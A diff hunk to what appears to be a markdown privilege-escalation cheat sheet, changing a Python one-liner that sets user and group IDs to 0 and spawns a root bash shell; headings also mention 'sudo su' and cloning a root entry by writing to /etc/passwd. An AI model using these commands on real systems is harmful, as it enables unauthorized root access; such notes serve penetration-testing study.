@@ -6,7 +6,7 @@ tags:
 ## `sudo su` (obvious no brainer)
 ## python: 
 ```sh
-python3 -c 'import os; os.setgid(0); os.setuid(0); os.setgroups([0]); os.system("/bin/bash")'
+python -c 'import os; os.setgid(0); os.setuid(0); os.setgroups([0]); os.system("/bin/bash")'
 ```
 ## `/etc/passwd` write root clone:
 ```sh
